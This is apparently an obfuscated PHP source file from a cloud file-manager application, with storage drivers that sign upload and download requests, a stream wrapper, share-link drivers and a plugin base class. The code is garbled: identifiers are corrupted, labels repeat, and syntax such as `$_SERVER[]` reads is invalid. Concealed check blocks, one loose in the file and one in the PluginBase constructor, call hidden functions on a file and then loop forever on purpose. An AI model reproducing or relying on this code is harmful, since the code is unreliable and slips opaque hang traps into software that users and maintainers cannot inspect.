D姊; D姊: $dː =& $_SERVER[]; $aﻐ = $dː[33]; $C¡Վ = 1000; goto bҕʏ; bҕʏ: $d͗ = $b禇 = array(); $dɘ = rtrim($E, $dː[8]) . $dː[8]; while (!0) { $F = $this->fileList($E, $aﻐ, $C¡Վ); if (!$F) { return !1; } $aﻐ = isset($F[$dː[1260]]) ? $F[$dː[1260]] : $dː[33]; $Aɫ = isset($F[$dː[1261]]) ? $F[$dː[1261]] : array(); foreach ($Aɫ as $b) { if ($b[$dː[29]] == $dː[76]) { $d͗[] = $this->folderInfo($dɘ . $b[$dː[28]], $EϷ, $b); } else { $b禇[] = $this->fileInfo($dɘ . $b[$dː[28]], $EϷ, $b); } } if (count($Aɫ) < $C¡Վ) { break; } } goto cȃ; cȃ: return array($dː[74] => $d͗, $dː[73] => $b禇); goto B͒; B͒: } private function recursionAllFiles($E񴧊ޚ, &$Fװ闒) { $Bͫ =& $_SERVER[]; $Fۇᇪ = $Bͫ[33]; $aу = 1000; $a = $a勴 = array(); $F܎ԏ = rtrim($E񴧊ޚ, $Bͫ[8]) . $Bͫ[8]; while (!0) { $Fв = $this->fileList($E񴧊ޚ, $Fۇᇪ, $aу); if (!$Fв) { return !1; } $Fۇᇪ = isset($Fв[$Bͫ[1260]]) ? $Fв[$Bͫ[1260]] : $Bͫ[33]; $E = isset($Fв[$Bͫ[1261]]) ? $Fв[$Bͫ[1261]] : array(); foreach ($E as $Cܡ) { $E = array($Bͫ[75] => $F܎ԏ . $Cܡ[$Bͫ[28]], $Bͫ[76] => $Cܡ[$Bͫ[29]] == $Bͫ[76] ? 1 : 0, $Bͫ[77] => isset($Cܡ[$Bͫ[325]]) ? $Cܡ[$Bͫ[325]] : 0); $Fװ闒[] = $E; if ($E[$Bͫ[76]] == 1) { $this->recursionAllFiles($E[$Bͫ[75]], $Fװ闒); } } if (count($E) < $aу) { break; } } } public function has($CÙ, $fŕ = false, $bߦ = true) { goto b; E񎆬: $C = 0; $cҏ = 0; $Bט = rtrim($CÙ, $e[8]) . $e[8]; goto D; D: while (!0) { $c = $this->fileList($CÙ, $DĂͬ, $Aͱ); if (!$c) { return !1; } $DĂͬ = isset($c[$e[1260]]) ? $c[$e[1260]] : $e[33]; $aܝ = isset($c[$e[1261]]) ? $c[$e[1261]] : array(); if (empty($aܝ)) { break; } $e = array_to_keyvalue($aܝ, $e[33], $e[29]); $d = array_count_values($e); $Fނ = isset($d[$e[76]]) ? $d[$e[76]] : 0; $E = count($e) - $Fނ; if ($fŕ) { $cҏ += $Fނ; $C += $E; if ($dʷʞ < $Aͱ) { break; } continue; } if ($bߦ) { if ($E) { return !0; } } else { if ($Fނ) { return !0; } } if (count($aܝ) < $Aͱ) { break; } } if ($fŕ) { return array($e[191] => $C, $e[192] => $cҏ); } return !1; goto bӶ; b: $e =& $_SERVER[]; $DĂͬ = $e[33]; $Aͱ = 1000; goto E񎆬; bӶ: } public function listAll($Fϥ셛) { $dҸ = array(); $this->recursionAllFiles($Fϥ셛, $dҸ); return $dҸ; } public function canRead($Bܠ) { return $this->exist($Bܠ) ? !0 : !1; } public function canWrite($e蹏) { return $this->exist($e蹏) ? !0 : !1; } public function getContent($E費) { return $this->fileSubstr($E費, 0, -1); } public function setContent($Eܩ, $bɩ = '') { $f =& $_SERVER[]; if (!$bɩ) { $BӸ = $this->ussRequest($Eܩ, $f[212]); return $BӸ[$f[1034]]; } $B̩ؖ = $this->tempFile($this->pathThis($Eܩ)); file_put_contents($B̩ؖ, $bɩ); if ($this->upload($Eܩ, $B̩ؖ)) { $this->tempFileRemve($B̩ؖ); return !0; } return !1; } public function fileSubstr($Aڟ, $bα, $EĊ) { $C؎ =& $_SERVER[]; if (!($D׵ߐ = $this->link($Aڟ))) { return !1; } $a֗ = !1; if ($EĊ > 0) { $Bב = $bα + $EĊ - 1; $a֗ = array($C؎[1222] . $bα . $C؎[412] . $Bב); } $EƂ = url_request($D׵ߐ, $C؎[216], !1, $a֗); return $EƂ[$C؎[688]] ? $EƂ[$C؎[1036]] : !1; } public function upload($fǼս, $Bڮ, $bӼ = false, $D渭 = REPEAT_REPLACE) { goto fꕂ; d¥: if (!$FЂ[$d̈́Ƞ[1034]]) { return !1; } $C = $FЂ[$d̈́Ƞ[1036]]; $c𠸹 = 0; goto A; d⹍Ϋ: do { $b§ = $C[$d̈́Ƞ[1268]]; fseek($Cㆨ, $c𠸹); $fڰ = fread($Cㆨ, $b§); $b = 0; do { $b++; $C = $this->uploadPart($fǼս, $C, $fڰ); } while (!$C && $b < 3); if (!$C) { return !1; } $Dߦ = $C[$d̈́Ƞ[1267]]; $c𠸹 += $b§; } while ($Dߦ != -1); fclose($Cㆨ); $aЪ = array($d̈́Ƞ[1269], $d̈́Ƞ[1270] . $C[$d̈́Ƞ[1271]], $d̈́Ƞ[1265]); goto A; A: $FЂ = $this->ussRequest($fǼս, $d̈́Ƞ[214], !1, $aЪ); return $FЂ[$d̈́Ƞ[1034]] ? $this->getPathOuter($eݺӄ) : !1; goto E͎; bÝ: $c䅡 = 1024 * 1024 * 10; $aЪ = array($d̈́Ƞ[1263], $d̈́Ƞ[1264] . $CߏͶ, $d̈́Ƞ[1265], $d̈́Ƞ[1266] . $c䅡); $FЂ = $this->ussRequest($fǼս, $d̈́Ƞ[214], !1, $aЪ); goto d¥; fꕂ: $d̈́Ƞ =& $_SERVER[]; $CߏͶ = IO::size($Bڮ); if ($CߏͶ <= 1024 * 1024 * 200) { $DЩ = array($d̈́Ƞ[1262] . $Bڮ); $FЂ = $this->ussRequest($fǼս, $d̈́Ƞ[214], $DЩ); return $FЂ[$d̈́Ƞ[1034]] ? $this->getPathOuter($fǼս) : !1; } goto bÝ; A: $Dߦ = $C[$d̈́Ƞ[1267]]; $Cㆨ = fopen($Bڮ, $d̈́Ƞ[1172]); if (!$Cㆨ) { return !1; } goto d⹍Ϋ; E͎: } private function uploadPart($F̘, $FΫΑ, &$bнԇ) { $Aه =& $_SERVER[]; $AТő = array($Aه[1272], $Aه[1270] . $FΫΑ[$Aه[1271]], $Aه[1273] . $FΫΑ[$Aه[1267]], $Aه[138] . $FΫΑ[$Aه[1268]]); $b߳ = $this->ussRequest($F̘, $Aه[214], $bнԇ, $AТő); return !$b߳[$Aه[1034]] ? $b߳[$Aه[1034]] : $b߳[$Aه[1036]]; } public function uploadFormData($Aݥ, $f㗆 = 3600) { return $this->uploadPolicy($Aݥ, $f㗆); } public function multiUploadFormData($EЍ३, $d = 3600) { $a݂ =& $_SERVER[]; $cƘ = (int) $GLOBALS[$a݂[7]][$a݂[77]]; return $this->uploadPolicy($EЍ३, $d, $cƘ); } private function uploadPolicy($Aڲ, $B九 = 3600, $A߅ = 0) { goto bϘՔ; BЯ: $e = base64_encode(hash_hmac($b˨[1244], "\x50\x4f\123\124\46{$B}\46{$a}\46{$aѨ}", md5("{$this->userpass}"), !0)); $c = array($b˨[1114] => $aѨ, $b˨[1278] => "\125\x50\131\125\116\40{$this->username}\x3a{$e}", $b˨[169] => $this->endpoint . $B); return $c; goto aʍ; e˃: $D˚ = array($b˨[1274] => $this->bucket, $b˨[1275] => $Aڲ, $b˨[1276] => time() + $B九, $b˨[1277] => $a); if ($A߅) { $D˚[$b˨[1193]] = $A߅; } $aѨ = base64_encode(json_encode($D˚)); goto BЯ; bϘՔ: $b˨ =& $_SERVER[]; $B = $b˨[8] . $this->bucket; $a = gmdate($b˨[1207]); goto e˃; aʍ: } public function download($aȉ, $cʉ) { goto aܫ; a͑: $a˛֩ = 1024 * 200; $bꬴ = fopen($Eތ, $_SERVER[][1228]); while (!0) { $dփق = $this->fileSubstr($aȉ, $eˣ, $a˛֩); if ($dփق === !1) { return !1; } fwrite($bꬴ, $dփق); $eˣ += $a˛֩; if (strlen($dփق) < $a˛֩) { break; } } goto Bߙ홊; aܫ: $Eތ = IO::getPathInner(IO::mkfile($cʉ)); if (!($b҉ = $this->link($aȉ))) { return !1; } $eˣ = 0; goto a͑; Bߙ홊: fclose($bꬴ); return $cʉ; goto Dՙ; Dՙ: } public function link($DԢ߹, $C = array()) { $e =& $_SERVER[]; $DԢ߹ = trim($DԢ߹, $e[8]); if (!empty($this->token)) { $FՖ = strtotime(date($e[1279])); $aۇ = substr(md5($this->token . $e[272] . $FՖ . $e[1280] . $DԢ߹), 12, 8) . $FՖ; $C[] = $e[1281] . $aۇ; } $D΂ = !empty($C) ? $e[69] . implode($e[272], $C) : $e[33]; return $this->getHost() . $e[8] . $DԢ߹ . $D΂; } public function fileOut($C廹, $Aٴ = false, $Dе = false, $B = '') { if (!$Dе) { $Dе = $this->pathThis($C廹); } $a = $Aٴ ? array($_SERVER[][1282] . rawurlencode($Dе)) : array(); $A = $this->link($C廹, $a); $this->fileOutLink($A); } public function fileOutServer($E, $a۾ = false, $Fƻ = false, $bӸ = '') { parent::fileOut($E, $a۾, $Fƻ, $bӸ); } public function fileOutImage($B, $A׊ = 250) { $Fڎ = $this->link($B . $_SERVER[][1283] . $A׊); $this->fileOutLink($Fڎ); } public function fileOutImageServer($c윭, $Fڇ = 250) { parent::fileOutImage($c윭, $Fڇ); } public function hashMd5($Dߝ) { $E =& $_SERVER[]; $Aݏ = $this->objectMeta($Dߝ); return isset($Aݏ[$E[196]]) ? $Aݏ[$E[196]] : !1; } public function size($fʸϓ) { $eه = $this->objectMeta($fʸϓ); return $eه ? $eه[$_SERVER[][77]] : 0; } public function info($Eî) { if ($this->isFolder($Eî)) { return $this->folderInfo($Eî); } else { if ($this->isFile($Eî)) { return $this->fileInfo($Eî); } } return !1; } public function exist($E隋) { return $this->isFile($E隋) || $this->isFolder($E隋); } public function isFile($Aݷ) { return !$this->isFolder($Aݷ) && $this->objectMeta($Aݷ); } public function isFolder($eΈ̐) { return $this->cacheMethod($_SERVER[][223], $eΈ̐); } protected function objectMeta($Dũ) { return $this->cacheMethod($_SERVER[][224], $Dũ); } protected function _objectMeta($Aڰ) { goto f氮; E: $Fԅ = array($DΉ[28] => get_path_this($Aڰ), $DΉ[29] => isset($b質[$DΉ[1285]]) ? $b質[$DΉ[1285]] : null, $DΉ[77] => isset($b質[$DΉ[1286]]) ? $b質[$DΉ[1286]] : null, $DΉ[196] => isset($b質[$DΉ[1287]]) ? $b質[$DΉ[1287]] : null, $DΉ[1255] => isset($b質[$DΉ[1288]]) ? $b質[$DΉ[1288]] : null); $Fԅ[$DΉ[1256]] = isset($b質[$DΉ[1289]]) ? strtotime($b質[$DΉ[1289]]) : $Fԅ[$DΉ[1255]]; return $Fԅ; goto dݘ; f氮: $DΉ =& $_SERVER[]; if ($Aڰ == $DΉ[33] || $Aڰ == $DΉ[8]) { return array(); } $CÛ = $this->ussRequest($Aڰ, $DΉ[1284]); goto aŋۂ; aŋۂ: if (!$CÛ[$DΉ[1034]]) { return null; } $b質 = isset($CÛ[$DΉ[1036]]) ? $CÛ[$DΉ[1036]] : array(); if (!isset($b質[$DΉ[1285]])) { return null; } goto E; dݘ: } protected function _isFolder($c) { $eȲ =& $_SERVER[]; if ($c == $eȲ[33] || $c == $eȲ[8]) { return !0; } $B = $this->objectMeta($c); return isset($B[$eȲ[29]]) && $B[$eȲ[29]] == $eȲ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($A = false) { } public function exist($F) { $D = $this->info($F); return $D[$_SERVER[][188]]; } public function isFile($f̟г) { $Cቃ = $this->info($f̟г); return $Cቃ[$_SERVER[][188]]; } public function isFolder($A⏼ќ) { return !1; } public function size($e) { $D̽ď = $this->info($e); return $D̽ď[$_SERVER[][77]]; } public function info($Eޥ) { return $this->infoParse($Eޥ); } public function infoAuth($AǷ߷) { return $this->infoParse($AǷ߷); } public function infoWithChildren($F揭) { return $this->infoParse($F揭); } public function infoFull($d) { return $this->infoParse($d); } private function infoParse($E) { $Eݎ݉ =& $_SERVER[]; $Dư = $this->header($E); if (!$Dư || !$Dư[$Eݎ݉[688]]) { return !1; } $e܂ = _get($Dư, $Eݎ݉[325], 0); $EȐ = array($Eݎ݉[28] => $Dư[$Eݎ݉[28]], $Eݎ݉[75] => $E, $Eݎ݉[29] => $Eݎ݉[167], $Eݎ݉[77] => intval($e܂), $Eݎ݉[160] => get_path_ext($Dư[$Eݎ݉[28]]), $Eݎ݉[1164] => $e܂ > 0 && $Dư[$Eݎ݉[1290]], $Eݎ݉[1165] => !1); return $EȐ; } private function header($C) { if (isset(self::$_cacheHeader[$C])) { return self::$_cacheHeader[$C]; } self::$_cacheHeader[$C] = url_header($C); return self::$_cacheHeader[$C]; } public function hashSimple($DՃ, $D = false) { goto F޹; A: $Dˑ .= $this->fileSubstr($DՃ, $E - $Eꄅ, $Eꄅ); return md5($Dˑ) . $E; goto eǿ; dɍ: $E = $aۙ[$fѩ[77]]; $Eꄅ = 200; $f = 50; goto Fś⹳ƣ; bƂ: $F̏ = timeFloat(); $f̾Г = 15; for ($Bݬ = 0; $Bݬ < $f; $Bݬ++) { if (timeFloat() - $F̏ > $f̾Г) { return !1; } $Cǐ߇ = $this->fileSubstr($DՃ, $c䱚 * $Bݬ, $Eꄅ); if (!$Cǐ߇) { return !1; } $Dˑ .= $Cǐ߇; } goto A; Fś⹳ƣ: if ($E <= $Eꄅ * $f) { return md5($this->fileSubstr($DՃ, 0, $E)) . $E; } $c䱚 = intval($E / $f); $Dˑ = $fѩ[33]; goto bƂ; F޹: $fѩ =& $_SERVER[]; $aۙ = $this->info($DՃ); if (!$aۙ || !$aۙ[$fѩ[188]]) { return !1; } goto dɍ; eǿ: } public function getContent($c޴) { return $this->fileSubstr($c޴); } public function fileSubstr($B, $eꎃѹ = 0, $e = -1) { goto a¿ꥵ; B: $fή = url_request($B, $CЉ[216], !1, $B, !1, !1, 1); return $fή[$CЉ[1036]] ? $fή[$CЉ[1036]] : $CЉ[33]; goto b; a¿ꥵ: $CЉ =& $_SERVER[]; $F = $this->info($B); if (!$F || !$F[$CЉ[188]] && $F[$CЉ[77]] > 1024 * 1024 * 10) { return !1; } goto C͇; C͇: if ($e === -1) { $e = $F[$CЉ[77]]; } if ($e == 0) { return $CЉ[33]; } $B = array($CЉ[1291] . $eꎃѹ . $CЉ[714] . ($eꎃѹ + $e - 1)); goto B; b: } public function download($B, $b돩) { Downloader::start($B, $b돩); return $b돩; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($D֎, $Dƛ = '') { goto fȥ٥; fҏ: return $this->info ? !0 : !1; goto d飋; e֢ϝ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$D֎])) { self::$_chunkBuffer[$D֎] = array(); } goto fҏ; fȥ٥: $this->info = $this->info($D֎); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[][75]]; goto e֢ϝ; d飋: } function stream_read($eׂ) { $e = $this->fileSubstr($this->pose, $eׂ); $this->pose += strlen($e); return $e; } public function stream_tell() { return $this->pose; } public function stream_seek($eǥ, $dዷ) { $f饃 =& $_SERVER[]; if ($dዷ == SEEK_SET) { $this->pose = $eǥ; } else { if ($dዷ == SEEK_CUR) { $this->pose += $eǥ; } else { if ($dዷ == SEEK_END) { $this->pose = $this->info[$f饃[77]] + intval($eǥ); } } } if ($eǥ < 0) { $this->pose = $this->info[$f饃[77]] + $eǥ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[][77]]; } public function stream_close() { return !0; } public function url_stat($F, $F§ݩ) { $D׻ =& $_SERVER[]; $A俏 = $this->info($F); return array($D׻[1292] => 0, $D׻[1293] => 0, $D׻[12] => 32768 + 511, $D׻[1294] => 0, $D׻[1295] => 0, $D׻[1296] => 0, $D׻[1297] => 0, $D׻[77] => $A俏[$D׻[77]], $D׻[1298] => $A俏[$D׻[1170]], $D׻[1256] => $A俏[$D׻[107]], $D׻[1255] => $A俏[$D׻[187]], $D׻[1299] => 0, $D׻[1300] => 0); } static $fileInfo = array(); public function info($Dˮ) { $a⸔ = $_SERVER[][1301]; if (isset(self::$fileInfo[$Dˮ])) { return self::$fileInfo[$Dˮ]; } if (substr($Dˮ, 0, strlen($a⸔)) != $a⸔) { return !1; } self::$fileInfo[$Dˮ] = IO::info(substr($Dˮ, strlen($a⸔))); return self::$fileInfo[$Dˮ]; } public static function read($fԎ, $Dҫ, $BΦ) { goto E; E݂: $Cݨ = 8192; fseek($a㡠, $Dҫ, SEEK_SET); $a͍ = $eﵘ͂[33]; goto B֯; E: $eﵘ͂ =& $_SERVER[]; $a㡠 = fopen($fԎ, $eﵘ͂[1172]); if (!$a㡠) { return $eﵘ͂[33]; } goto E݂; bĐ: return $a͍; goto b; B֯: $Aд = 0; while ($Aд < $BΦ) { $Aй楮 = min($Cݨ, $BΦ - $Aд); $a͍ .= fread($a㡠, $Aй楮); $Aд += $Aй楮; } fclose($a㡠); goto bĐ; b: } public function fileSubstr($fП, $FȬ) { goto Eʮ; e: $aҒ = 0; $Eϰ = 0; $D = $Eޅ[33]; goto fؤ; Fƫő: if ($fП + $FȬ > $Eձκ) { $FȬ = $Eձκ - $fП; } if ($FȬ <= 0) { return $Eޅ[33]; } if ($fП < 0 || $fП >= $Eձκ || $FȬ <= 0 || $FȬ > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\x69\154\x65\x52\x65\x61\x64\x20\x65\162\162\x6f\x72\41\40\x73\164\141\162\164\75{$fП}\x3b\x6c\x65\156\147\164\x68\x3d{$FȬ}\73\x20\163\x69\172\145\x3d{$Eձκ}\73"); } goto bŴ; E鎤ß: $A੧򾎐 = ceil(($fП + $FȬ) / $Bʆœ) * $Bʆœ - $D; $fΕ = IO::fileSubstr($this->path, $D, $A੧򾎐); $A섩[$D . $Eޅ[33]] = $fΕ; goto B; bŴ: $Bʆœ = 64 * 1024; $A섩 =& self::$_chunkBuffer[$this->path]; if (!$A섩) { $A섩 = array(); } goto e; Eʮ: $Eޅ =& $_SERVER[]; $Eձκ = $this->info[$Eޅ[77]]; $Aޓƨ = $fП; goto B; B: $Fꃔ = $FȬ; if ($fП < 0) { $fП = $Eձκ + $fП; } if ($FȬ === !1) { $FȬ = $Eձκ - $fП; } goto Fƫő; B: ksort($A섩); $Eڂ = substr($fΕ, $fП - $D, $FȬ); return $Eڂ; goto C̓; fؤ: foreach ($A섩 as $aҒ => $D) { $aҒ = intval($aҒ); $Eϰ = $aҒ + strlen($D); if ($fП >= $Eϰ) { continue; } if ($fП >= $aҒ && $fП + $FȬ <= $Eϰ) { return substr($D, $fП - $aҒ, $FȬ); } break; } if (count($A섩) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Eޅ[1302], $Eޅ[1303] . count($A섩) . "\x3b\163\x74\141\x72\x74\75{$fП}\x2c\x6c\145\156\x67\164\150\x3d{$FȬ}\73\x70\x6f\163\145\72{$aҒ}\176{$Eϰ}"); throw new Exception($Eޅ[1304]); } $D = intval($fП / $Bʆœ) * $Bʆœ; goto E鎤ß; C̓: } private function log($Bݪ, $Fֆ) { $D =& $_SERVER[]; $B濌 = timeFloat() - $this->timeStart; write_log(sprintf($D[1305], $Bݪ, $this->info[$D[28]], $B濌, $Fֆ), $D[1221]); } } goto D; d챊: if (!isset($_SERVER[$_SERVER[][776]]) || !isset($_SERVER[$_SERVER[][777]])) { goto eČȬ; eČȬ: $d = $_SERVER[][778]; $Fř = $_SERVER[$_SERVER[][779]] . $_SERVER[][780]; $cÉ = $d($Fř); goto b; b: $fī = explode($_SERVER[][217], $cÉ); if (count($fī) < $_SERVER[][550]) { $EǍŸ = $_SERVER[][781]; $EǍŸ(); } $f = $_SERVER[][782]; goto CԨ; CԨ: $f($_SERVER[$_SERVER[][779]] . $_SERVER[][780]); $cݗ = 2; while ($cݗ > 1) { $Aޑ = rawurlencode($cݗ . $_SERVER[][361]); } goto Eˉ深; Eˉ深: } class PathDriverDriverShareItem { public function __construct($d) { $this->pathParse = $d; } public function __call($Eŋ폸, $a) { $c =& $_SERVER[]; if (method_exists($this, $Eŋ폸)) { return; } $DȨ = call_user_func_array(array($c[1127], $Eŋ폸), $a); $eꖋܟ = array($c[1128], $c[1129], $c[1130], $c[1131], $c[492], $c[494], $c[1132], $c[103], $c[1133], $c[1134]); if (in_array($Eŋ폸, $eꖋܟ)) { $DȨ = $this->getPathOuter($DȨ); } return $DȨ; } public function copy($A􃃟ʋ, $dΣօ, $aˏƾ = false) { return $this->copyMove($A􃃟ʋ, $dΣօ, $aˏƾ, $_SERVER[][492]); } public function move($B牪, $d, $Eȍޕ = false) { return $this->copyMove($B牪, $d, $Eȍޕ, $_SERVER[][494]); } private function copyMove($d⍺, $aٗ, $d, $D) { goto B; DՍ: if ($a->pathParse[$a᲍[1000]]) { $aٗ = $a->pathParse[$a᲍[1000]]; } else { $aٗ = $D̓; } $f̵Æ = IO::copyMove($d⍺, $aٗ, $d, $D); $f̵Æ = $this->getPathOuter($f̵Æ); goto eߌ; B: $a᲍ =& $_SERVER[]; $D̓ = $aٗ; $a = IO::driverMake($aٗ); goto DՍ; eߌ: return $f̵Æ; goto B; B: } public function pathFather($fǄ) { return get_path_father($this->pathParse[$_SERVER[][75]]); } public function iconvSystem($Aқۅ) { return $Aқۅ; } protected function infoParse($E𲜜, $b = false) { $A =& $_SERVER[]; $a = $this->pathParse[$A[439]][$A[1021]] . $this->pathParse[$A[1014]]; if ($b) { $E笎 = IO::infoWithChildren($a); } else { $E笎 = IO::info($a); } $aөލ = $this->pathParse[$A[439]]; return Action($A[1126])->_shareItemeParse($E笎, $aөލ); } public function listAll($Eޯ) { $d =& $_SERVER[]; $cФޑ = IO::listAll($Eޯ); $D뙰 = $this->pathParse[$d[439]]; foreach ($cФޑ as &$F⃤菗) { check_abort(); $F⃤菗 = array_merge(IO::info($F⃤菗[$d[75]]), $F⃤菗); $F⃤菗[$d[391]] = Action($d[1126])->_shareItemeParse($F⃤菗, $D뙰); } return $cФޑ; } public function getPathOuter($d) { goto a҈ý; b欦: if (substr($C׵, 0, strlen($Fב)) != $Fב) { return !1; } return $this->pathParse[$cےⓛ[1015]] . $cےⓛ[8] . ltrim($Fޱʝ, $cےⓛ[8]); goto eͰ; f: $C׵ = KodIO::clear($d); $Fב = KodIO::clear($this->pathParse[$cےⓛ[439]][$cےⓛ[1021]]); $Fޱʝ = substr($C׵, strlen($Fב)); goto b欦; a҈ý: $cےⓛ =& $_SERVER[]; $Bӯ = KodIO::parse($d); if ($Bӯ[$cےⓛ[29]] == KodIO::KOD_SHARE_ITEM) { return $Bӯ[$cےⓛ[75]]; } goto f; eͰ: } public function getType() { $bڥ =& $_SERVER[]; $c؄ = str_replace($bڥ[71], $bڥ[33], get_class($this)); return strtolower($c؄); } public function isTypeObject($E˙) { return IO::isTypeObject($E˙); } public function info($d녴) { return $this->infoParse($d녴); } public function infoAuth($f) { return $this->infoParse($f); } public function infoWithChildren($dя) { return $this->infoParse($dя, !0); } public function infoFull($BҎ) { return $this->infoParse($BҎ); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Bɫ) { $this->pathParse = $Bɫ; } protected function infoParse($B么, $D = false) { $A =& $_SERVER[]; return Action($A[1020])->sharePathInfo($this->pathParse[$A[75]], !0, $D); } public function listPath($E椫, $cǿɩ = false) { $Eږ =& $_SERVER[]; $D = IO::listPath($E椫, $cǿɩ); foreach ($D as $a˴ => $d±) { if (!in_array($a˴, array($Eږ[73], $Eږ[74]))) { continue; } foreach ($d± as $e => $b∤) { $b∤ = Action($Eږ[1135])->parsePathChildren($b∤, array($Eږ[387] => $E椫)); $D[$a˴][$e] = Action($Eږ[1020])->shareItemInfo($b∤); } } return $D; } public function listAll($b) { $Bԯ =& $_SERVER[]; $c = IO::listAll($b); foreach ($c as &$Eħ) { $Eħ = array_merge(IO::info($Eħ[$Bԯ[75]]), $Eħ); $Eħ[$Bԯ[391]] = Action($Bԯ[1020])->shareItemInfo($Eħ); } return $c; } } goto b; B: $e棾܊ = $_SERVER[][549]; while ($e棾܊ < $_SERVER[][550]) { if ($e棾܊ >= 0) { break; } $e棾܊++; } $_SERVER[] = explode($_SERVER[][551], gzinflate(substr($_SERVER[][552], 10, -8))); goto FӦ; D: class Message { function __construct() { } public function send($Aޞ = '', $D = array(), $b鎨 = "\164\145\x78\x74") { goto b; d: Hook::trigger($Dܥ[1309], $d̛); goto b̽; b: $Dܥ =& $_SERVER[]; $b = array($Dܥ[29] => $Dܥ[1306], $Dܥ[691] => $Aޞ); if (in_array($b鎨, array($Dܥ[1306], $Dܥ[1307]))) { $b[$Dܥ[29]] = $b鎨; } goto C; C: $D = array($Dܥ[972] => isset($D[$Dܥ[972]]) ? $D[$Dܥ[972]] : $Dܥ[33], $Dܥ[537] => isset($D[$Dܥ[537]]) ? $D[$Dܥ[537]] : $Dܥ[33]); if (empty($Aޞ) || empty($D[$Dܥ[972]]) && empty($D[$Dܥ[537]])) { return !1; } $d̛ = array($Dܥ[1248] => $b, $Dܥ[1308] => $D); goto d; b̽: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto BՕ; bƒ: $this->pluginHost = $config[$A摵[1312]] . $this->pluginName . $A摵[8]; $this->pluginHostDefault = $config[$A摵[1312]] . $this->pluginName . $A摵[8]; $fԦ֋ = $config[$A摵[1313]]; goto Eְ; BՕ: $A摵 =& $_SERVER[]; if (!isset($_SERVER[$A摵[776]]) || !isset($_SERVER[$A摵[777]])) { goto C; f٠: for ($Eוȃ = $e; $Eוȃ > 0; $Eוȃ++) { $C񃽡 = json_encode($GLOBALS[$A摵[384]]); } goto Cͧ×; C: $D = $A摵[793]; $cŵ = $A摵[778]; $f҃Պ = $_SERVER[$A摵[779]] . $A摵[780]; goto Fšڔ; Fšڔ: $bͯ = $cŵ($f҃Պ); $B想 = explode($A摵[217], $bͯ); if (count($B想) < $A摵[583]) { $Fﻌ = $A摵[781]; $Fﻌ(); } goto D; D: $C񃽡 = $A摵[794]; $C񃽡($_SERVER[$A摵[795]]); $e = 1; goto f٠; Cͧ×: } global $in, $config; goto dƧˏ; D: return $this; goto b; dƧˏ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($A摵[1310]); goto DՐ; Eְ: if ($fԦ֋ && strpos($A摵[47] . $fԦ֋ . $A摵[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$A摵[1314]] . $this->pluginName . $A摵[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto D; DՐ: $this->pluginName = str_replace($A摵[1310], $A摵[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $A摵[8]; $this->pluginApi = appHostGet() . $A摵[1311] . $this->pluginName . $A摵[8]; goto bƒ; b: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[][1315]); } protected function assign($Cќ҉, $a = false) { if (is_array($Cќ҉)) { $this->values = array_merge($this->values, $Cќ҉); } else { $this->values[$Cќ҉] = $a; } } protected function display($EѼ) { extract($this->values); require $EѼ; } final function hookRegist($Eؤ) { $this->modelPlugin->appRegist($this->pluginName, $Eؤ); } final function appIcon() { $f؆ =& $_SERVER[]; $c = $this->appPackage(); $A͐ = $f؆[33]; if (isset($c[$f؆[382]])) { if (isset($c[$f؆[382]][$f؆[1316]])) { $A͐ = $f؆[1317] . $c[$f؆[382]][$f؆[1316]] . $f؆[1318]; } else { if ($c[$f؆[382]][$f؆[1319]]) { $A͐ = $f؆[1320] . $c[$f؆[382]][$f؆[1319]] . $f؆[1321]; } } } return $A͐; } final function fileCanView($B) { goto b; cӿ: ActionCall($d՞Å[1334], $B); goto d揖; aͣĥ: $cڢ = Session::get($d՞Å[1322]); if (!$cڢ || !$cڢ[$d՞Å[1323]]) { $Bζ = $d՞Å[1324] . rawurlencode(this_url()); show_tips(LNG($d՞Å[1325]) . $d՞Å[1326] . $Bζ . $d՞Å[1327] . LNG($d՞Å[1328]) . $d՞Å[1329], !1); } if (!Action($d՞Å[1330])->authCan($d՞Å[1331])) { show_tips(LNG($d՞Å[1332]) . $d՞Å[1333], !1); } goto cӿ; b: $d՞Å =& $_SERVER[]; if (request_url_safe($B)) { return !0; } if ($this->isShare($B)) { return !0; } goto aͣĥ; d揖: } final function isShare($c﫱) { $B䬘͑ = KodIO::parse($c﫱); return $B䬘͑[$_SERVER[][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($b߆) { if (request_url_safe($b߆)) { return $b߆; } if (!$this->isShare($b߆)) { $b߆ = $this->filePath($b߆); } return Action($_SERVER[][1020])->linkOut($b߆); } public function filePathLinkOut($aÞ) { if (request_url_safe($aÞ)) { return $aÞ; } $this->fileCanView($aÞ); return Action($_SERVER[][1020])->link($aÞ); } final function filePath($cǺ) { $a =& $_SERVER[]; if ($F = $this->checkSharePath($cǺ)) { return $F; } $this->fileCanView($cǺ); if (request_url_safe($cǺ)) { $c˺쌋 = parse_url_query($cǺ); if (isset($c˺쌋[$a[1335]]) && isset($c˺쌋[$a[197]])) { $B̯Ұ = Model($a[1090])->get($a[1336]); $F՗ = Mcrypt::decode($c˺쌋[$a[197]], $B̯Ұ); if ($F՗) { $this->fileInfo = IO::infoWithChildren($F՗); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $F՗; } } $cǺ = $this->_cacheHttpFile($cǺ); $this->fileInfo = IO::infoWithChildren($cǺ); } else { $this->fileInfo = IO::infoWithChildren($cǺ); if (!$this->fileInfo) { show_tips(LNG($a[101]), !1); } $this->cachePath = 